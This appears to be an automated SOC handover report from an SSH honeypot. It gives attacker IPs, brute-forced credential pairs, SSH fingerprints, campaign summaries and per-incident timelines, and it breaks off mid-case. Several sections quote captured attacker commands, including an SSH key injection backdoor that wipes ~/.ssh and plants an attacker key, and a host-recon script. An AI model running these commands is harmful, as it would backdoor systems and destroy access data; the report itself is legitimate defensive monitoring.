# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-17 |
| **Generated At** | 2026-07-17T19:16:53Z |
| **Shift Time** | 19:16 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **132** |
| Confirmed Threats | **109** |
| False Positives Filtered | **23** (17.4%) |
| Unique Attacker IPs | **70** |
| Countries of Origin | **27** |
| High Severity Cases | **82** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **50** |
| Malware Samples Analyzed | **3** HIGH · **34** MED · 8 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **109** |
| Unique Credential Pairs | **63** |
| Unique Usernames | **18** |
| Unique Passwords | **58** |
| Successful Auth Pairs | **91** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 51 |
| `support` | 11 |
| `admin` | 7 |
| `default` | 5 |
| `config` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `default` | 6 |
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 4 |
| `qazwsx12` | 4 |
| `123` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `config` | `default` | 5 |
| `345gs5662d34` | `345gs5662d34` | 4 |
| `support` | `qazwsx12` | 4 |
| `support` | `support` | 4 |
| `nobody` | `nobody2011` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1qaz2wsx3edc!` | `52.140.76.154` | 2026-07-17T16:55:30 |
| `345gs5662d34` | `345gs5662d34` | `52.140.76.154` | 2026-07-17T16:55:34 |
| `root` | `3245gs5662d34` | `52.140.76.154` | 2026-07-17T16:55:35 |
| `root` | `Root123` | `195.178.110.232` | 2026-07-17T16:56:34 |
| `support` | `qazwsx12` | `121.202.138.181` | 2026-07-17T16:57:15 |
| `root` | `admin` | `195.178.110.232` | 2026-07-17T16:58:16 |
| `temp` | `123` | `186.31.95.163` | 2026-07-17T16:58:50 |
| `345gs5662d34` | `345gs5662d34` | `186.31.95.163` | 2026-07-17T16:58:53 |
| `temp` | `3245gs5662d34` | `186.31.95.163` | 2026-07-17T16:58:53 |
| `VPN` | `VPN` | `69.49.246.176` | 2026-07-17T16:59:37 |
| `345gs5662d34` | `345gs5662d34` | `69.49.246.176` | 2026-07-17T16:59:38 |
| `VPN` | `3245gs5662d34` | `69.49.246.176` | 2026-07-17T16:59:38 |
| `root` | `admin123` | `195.178.110.232` | 2026-07-17T16:59:48 |
| `support` | `qazwsx12` | `177.72.87.7` | 2026-07-17T17:00:44 |
| `support` | `qazwsx12` | `10.0.0.73` | 2026-07-17T17:01:07 |
| `root` | `alpine` | `195.178.110.232` | 2026-07-17T17:01:23 |
| `root` | `changeme` | `195.178.110.232` | 2026-07-17T17:02:59 |
| `root` | `default` | `195.178.110.232` | 2026-07-17T17:04:50 |
| `root` | `letmein` | `195.178.110.232` | 2026-07-17T17:06:37 |
| `root` | `passw0rd` | `195.178.110.232` | 2026-07-17T17:08:33 |
| `user` | `user12345` | `111.70.39.214` | 2026-07-17T17:09:08 |
| `user` | `user12345` | `207.219.221.101` | 2026-07-17T17:09:15 |
| `root` | `password` | `195.178.110.232` | 2026-07-17T17:10:40 |
| `default` | `tlJwpbo6` | `169.211.128.234` | 2026-07-17T17:10:42 |
| `support` | `support` | `176.53.159.196` | 2026-07-17T17:11:07 |
| `root` | `jvc` | `169.211.128.234` | 2026-07-17T17:11:17 |
| `lghkel	` | `zpz}ld	` | `169.211.128.234` | 2026-07-17T17:11:51 |
| `b'\xda\xdb\xd8\xdf\xcb\xd2\xca'` | `b'\xda\xdb\xd8\xdf\xcb\xd2\xca'` | `169.211.128.234` | 2026-07-17T17:12:25 |
| `support` | `support` | `10.0.0.73` | 2026-07-17T17:12:25 |
| `root` | `qwerty` | `195.178.110.232` | 2026-07-17T17:12:31 |
| `root` | `uClinux` | `169.211.128.234` | 2026-07-17T17:12:59 |
| `admin` | `ZmqVfoSIP` | `169.211.128.234` | 2026-07-17T17:13:33 |
| `default` | `S2fGqNFs` | `169.211.128.234` | 2026-07-17T17:14:07 |
| `"??$` | `aaaa` | `169.211.128.234` | 2026-07-17T17:15:16 |
| `root` | `r00t` | `195.178.110.232` | 2026-07-17T17:15:40 |
| `root` | `GM8182` | `169.211.128.234` | 2026-07-17T17:15:50 |
| `centos` | `centos2025` | `83.239.108.218` | 2026-07-17T17:16:19 |
| `centos` | `centos2025` | `186.239.41.74` | 2026-07-17T17:16:26 |
| `root` | `adminadmin` | `217.52.226.144` | 2026-07-17T17:18:39 |
| `root` | `adminadmin` | `10.0.0.73` | 2026-07-17T17:18:54 |
| `root` | `QWE123ASD123ZXC` | `185.242.3.195` | 2026-07-17T17:24:14 |
| `root` | `s553355` | `183.167.217.86` | 2026-07-17T17:25:59 |
| `root` | `s553355` | `10.0.0.73` | 2026-07-17T17:26:16 |
| `root` | `root123` | `195.178.110.232` | 2026-07-17T17:27:35 |
| `root` | `root@123` | `195.178.110.232` | 2026-07-17T17:29:49 |
| `debian` | `administrator` | `82.193.122.91` | 2026-07-17T17:34:06 |
| `root` | `rootme` | `195.178.110.232` | 2026-07-17T17:34:39 |
| `debian` | `administrator` | `10.0.0.73` | 2026-07-17T17:38:03 |
| `root` | `QWE123ASD123ZXC` | `10.0.0.73` | 2026-07-17T17:38:22 |
| `support` | `123` | `14.97.77.182` | 2026-07-17T17:40:08 |
| `nobody` | `nobody2011` | `111.70.23.254` | 2026-07-17T17:40:09 |
| `nobody` | `nobody2011` | `213.230.64.246` | 2026-07-17T17:40:18 |
| `support` | `123` | `213.234.9.218` | 2026-07-17T17:40:20 |
| `support` | `123` | `118.122.196.230` | 2026-07-17T17:43:46 |
| `nobody` | `nobody2011` | `10.0.0.73` | 2026-07-17T17:43:53 |
| `root` | `system` | `195.178.110.232` | 2026-07-17T17:45:38 |
| `root` | `toor` | `195.178.110.232` | 2026-07-17T17:49:08 |
| `test` | `marketing` | `222.86.168.224` | 2026-07-17T17:51:12 |
| `test` | `marketing` | `10.0.0.73` | 2026-07-17T17:51:36 |
| `root` | `1234567` | `196.188.187.205` | 2026-07-17T17:59:35 |
| `root` | `welcome` | `195.178.110.232` | 2026-07-17T18:00:30 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-17T18:02:15 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-17T18:02:15 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-17T18:02:19 |
| `root` | `1234567` | `35.130.111.146` | 2026-07-17T18:02:55 |
| `config` | `default` | `65.20.158.10` | 2026-07-17T18:06:08 |
| `config` | `default` | `85.105.255.56` | 2026-07-17T18:06:17 |
| `root` | `!qaz2wsX` | `103.174.103.19` | 2026-07-17T18:07:45 |
| `345gs5662d34` | `345gs5662d34` | `103.174.103.19` | 2026-07-17T18:07:50 |
| `root` | `3245gs5662d34` | `103.174.103.19` | 2026-07-17T18:07:52 |
| `Admin` | `123.com` | `111.70.49.182` | 2026-07-17T18:09:10 |
| `Admin` | `123.com` | `10.0.0.73` | 2026-07-17T18:09:29 |
| `config` | `default` | `119.207.49.167` | 2026-07-17T18:09:35 |
| `config` | `default` | `10.0.0.73` | 2026-07-17T18:09:57 |
| `admin` | `admin` | `101.47.15.119` | 2026-07-17T18:13:08 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-17T18:13:09 |
| `root` | `qed` | `185.242.3.195` | 2026-07-17T18:17:12 |
| `root` | `ubuntu` | `188.32.210.218` | 2026-07-17T18:18:00 |
| `admin` | `0987654321` | `78.25.127.202` | 2026-07-17T18:24:43 |
| `admin` | `0987654321` | `178.178.194.131` | 2026-07-17T18:28:19 |
| `root` | `qed` | `10.0.0.73` | 2026-07-17T18:31:05 |
| `admin` | `admin2011` | `61.12.84.172` | 2026-07-17T18:33:12 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-07-17T18:33:17 |
| `admin` | `admin2011` | `213.154.80.51` | 2026-07-17T18:33:24 |
| `root` | `admin123!@#` | `82.193.122.91` | 2026-07-17T18:35:40 |
| `root` | `admin123!@#` | `61.185.30.170` | 2026-07-17T18:39:14 |
| `root` | `admin123!@#` | `10.0.0.73` | 2026-07-17T18:39:36 |
| `root` | `---fuck_you----` | `180.76.57.94` | 2026-07-17T18:40:36 |
| `ubnt` | `Passw0rd` | `10.0.0.73` | 2026-07-17T18:53:37 |
| `default` | `default2012` | `121.179.93.147` | 2026-07-17T18:54:38 |
| `default` | `default2012` | `93.4.16.74` | 2026-07-17T18:54:47 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **132** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 29 |
| Go SSH scanner | 28 |
| libssh | 13 |
| Paramiko (Python) | 6 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 29 | 28 |
| `2ec37a7cc8da...` | Mirai/variant | 18 | 1 |
| `f555226df196...` | Mirai/variant | 12 | 4 |
| `16443846184e...` | Generic scanner | 5 | 2 |
| `a2de0f306611...` | Mirai/variant | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 29 | 28 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 18 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 12 | 4 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 5 | 2 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `a704be057881...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 17 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.232`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `69.49.246.176`, `186.31.95.163`, `103.174.103.19`, `52.140.76.154`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **70** |
| Unique ASNs | **48** |
| High-Risk ASNs | **42** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 8 | MEDIUM |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS22773` | Cox Communications Inc. | 4 | MEDIUM |
| `AS17421` | Mobile Business Group | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS8473` | Bahnhof AB | 2 | HIGH |
| `AS45820` | Tata Teleservices ISP AS | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (82)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-f3e82505b55b

| Field | Detail |
|---|---|
| **Source IP** | `52.140.76[.]154` |
| **First Seen** | 2026-07-17 16:55 |
| **Last Seen** | 2026-07-17 16:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 16:55:29` | `cowrie.session.connect` |
| `2026-07-17 16:55:29` | `cowrie.client.version` |
| `2026-07-17 16:55:29` | `cowrie.client.kex` |
| `2026-07-17 16:55:30` | `cowrie.login.success` |
| `2026-07-17 16:55:31` | `cowrie.session.params` |
| `2026-07-17 16:55:31` | `cowrie.command.input` |
| `2026-07-17 16:55:31` | `cowrie.command.failed` |
| `2026-07-17 16:55:32` | `cowrie.log.closed` |
| `2026-07-17 16:55:32` | `cowrie.session.params` |
| `2026-07-17 16:55:32` | `cowrie.command.input` |
| `2026-07-17 16:55:33` | `cowrie.session.file_download` |
| `2026-07-17 16:55:33` | `cowrie.log.closed` |
| `2026-07-17 16:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.140.76[.]154` to AbuseIPDB if not already reported
- [ ] Block `52.140.76[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e379195b46f

| Field | Detail |
|---|---|
| **Source IP** | `52.140.76[.]154` |
| **First Seen** | 2026-07-17 16:55 |
| **Last Seen** | 2026-07-17 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 16:55:33` | `cowrie.session.connect` |
| `2026-07-17 16:55:33` | `cowrie.client.version` |
| `2026-07-17 16:55:33` | `cowrie.client.kex` |
| `2026-07-17 16:55:34` | `cowrie.login.success` |
| `2026-07-17 16:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.140.76[.]154` to AbuseIPDB if not already reported
- [ ] Block `52.140.76[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b487ad67712b

| Field | Detail |
|---|---|
| **Source IP** | `52.140.76[.]154` |
| **First Seen** | 2026-07-17 16:55 |
| **Last Seen** | 2026-07-17 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 16:55:34` | `cowrie.session.connect` |
| `2026-07-17 16:55:34` | `cowrie.client.version` |
| `2026-07-17 16:55:34` | `cowrie.client.kex` |
| `2026-07-17 16:55:35` | `cowrie.login.success` |
| `2026-07-17 16:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.140.76[.]154` to AbuseIPDB if not already reported
- [ ] Block `52.140.76[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13482ce5f0f9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-17 16:56 |
| **Last Seen** | 2026-07-17 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 16:56:34` | `cowrie.session.connect` |
| `2026-07-17 16:56:34` | `cowrie.client.version` |
| `2026-07-17 16:56:34` | `cowrie.client.kex` |
| `2026-07-17 16:56:34` | `cowrie.login.success` |
| `2026-07-17 16:56:35` | `cowrie.session.params` |
| `2026-07-17 16:56:35` | `cowrie.command.input` |
| `2026-07-17 16:56:35` | `cowrie.command.input` |
| `2026-07-17 16:56:35` | `cowrie.command.input` |
| `2026-07-17 16:56:35` | `cowrie.command.input` |
| `2026-07-17 16:56:35` | `cowrie.command.input` |
| `2026-07-17 16:56:35` | `cowrie.command.success` |
| `2026-07-17 16:56:35` | `cowrie.command.input` |
| `2026-07-17 16:56:35` | `cowrie.command.input` |
| `2026-07-17 16:56:35` | `cowrie.command.input` |
| `2026-07-17 16:56:35` | `cowrie.command.input` |
| `2026-07-17 16:56:36` | `cowrie.log.closed` |
| `2026-07-17 16:56:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcefbcefb3ff

| Field | Detail |
|---|---|
| **Source IP** | `121.202.138[.]181` |
| **First Seen** | 2026-07-17 16:57 |
| **Last Seen** | 2026-07-17 16:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 16:57:12` | `cowrie.session.connect` |
| `2026-07-17 16:57:12` | `cowrie.client.version` |
| `2026-07-17 16:57:12` | `cowrie.client.kex` |
| `2026-07-17 16:57:15` | `cowrie.login.success` |
| `2026-07-17 16:57:16` | `cowrie.direct-tcpip.request` |
| `2026-07-17 16:57:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.202.138[.]181` to AbuseIPDB if not already reported
- [ ] Block `121.202.138[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b74ca76b924e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-17 16:58 |
| **Last Seen** | 2026-07-17 16:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 16:58:15` | `cowrie.session.connect` |
| `2026-07-17 16:58:15` | `cowrie.client.version` |
| `2026-07-17 16:58:15` | `cowrie.client.kex` |
| `2026-07-17 16:58:16` | `cowrie.login.success` |
| `2026-07-17 16:58:17` | `cowrie.session.params` |
| `2026-07-17 16:58:17` | `cowrie.command.input` |
| `2026-07-17 16:58:17` | `cowrie.command.input` |
| `2026-07-17 16:58:17` | `cowrie.command.input` |
| `2026-07-17 16:58:17` | `cowrie.command.input` |
| `2026-07-17 16:58:17` | `cowrie.command.input` |
| `2026-07-17 16:58:17` | `cowrie.command.success` |
| `2026-07-17 16:58:17` | `cowrie.command.input` |
| `2026-07-17 16:58:17` | `cowrie.command.input` |
| `2026-07-17 16:58:17` | `cowrie.command.input` |
| `2026-07-17 16:58:17` | `cowrie.command.input` |
| `2026-07-17 16:58:18` | `cowrie.log.closed` |
| `2026-07-17 16:58:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64e29fbb4433

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-07-17 16:58 |
| **Last Seen** | 2026-07-17 16:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 16:58:50` | `cowrie.session.connect` |
| `2026-07-17 16:58:50` | `cowrie.client.version` |
| `2026-07-17 16:58:50` | `cowrie.client.kex` |
| `2026-07-17 16:58:50` | `cowrie.login.success` |
| `2026-07-17 16:58:51` | `cowrie.session.params` |
| `2026-07-17 16:58:51` | `cowrie.command.input` |
| `2026-07-17 16:58:51` | `cowrie.command.failed` |
| `2026-07-17 16:58:51` | `cowrie.log.closed` |
| `2026-07-17 16:58:52` | `cowrie.session.params` |
| `2026-07-17 16:58:52` | `cowrie.command.input` |
| `2026-07-17 16:58:52` | `cowrie.session.file_download` |
| `2026-07-17 16:58:52` | `cowrie.log.closed` |
| `2026-07-17 16:58:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b58163e5004

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-07-17 16:58 |
| **Last Seen** | 2026-07-17 16:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 16:58:52` | `cowrie.session.connect` |
| `2026-07-17 16:58:52` | `cowrie.client.version` |
| `2026-07-17 16:58:52` | `cowrie.client.kex` |
| `2026-07-17 16:58:53` | `cowrie.login.success` |
| `2026-07-17 16:58:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49a9662b6df0

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-07-17 16:58 |
| **Last Seen** | 2026-07-17 16:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 16:58:53` | `cowrie.session.connect` |
| `2026-07-17 16:58:53` | `cowrie.client.version` |
| `2026-07-17 16:58:53` | `cowrie.client.kex` |
| `2026-07-17 16:58:53` | `cowrie.login.success` |
| `2026-07-17 16:58:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81cb4cd7b650

| Field | Detail |
|---|---|
| **Source IP** | `69.49.246[.]176` |
| **First Seen** | 2026-07-17 16:59 |
| **Last Seen** | 2026-07-17 16:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
